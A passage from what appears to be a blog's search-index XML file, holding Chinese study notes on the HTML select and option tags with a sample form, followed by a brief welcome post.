class="headerlink" title="下拉框标签"></a>下拉框标签</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><br>常用属性：<br>     multiple  设置下拉框多选<br>     size      设置下拉框可见选项数<br>     disabled  禁用元素<br>     <br><span class="hljs-keyword">option</span>：下拉框的选项标签<br>      selected  默认选中值<br>      disabled  禁用某个选项<br>      <span class="hljs-keyword">value</span>     提交给服务器的选项值<br>例如：<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">multiple</span>=<span class="hljs-string">&quot;multiple&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q[]&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>选择一个站点<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;RUNOOB&quot;</span>&gt;</span>Runoob<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;GOOGLE&quot;</span>&gt;</span>Google<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;TAOBAO&quot;</span>&gt;</span>Taobao<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>效果图：</p><p><img src="/../image/%E4%B8%8B%E6%8B%89%E6%A1%86.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>welcome</title>
      <link href="/2024/12/25/welcome/"/>
      <url>/2024/12/25/welcome/</url>
      
        <content type="html"><![CDATA[<p>欢迎来我的博客</p><p><img src="/../image/01.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
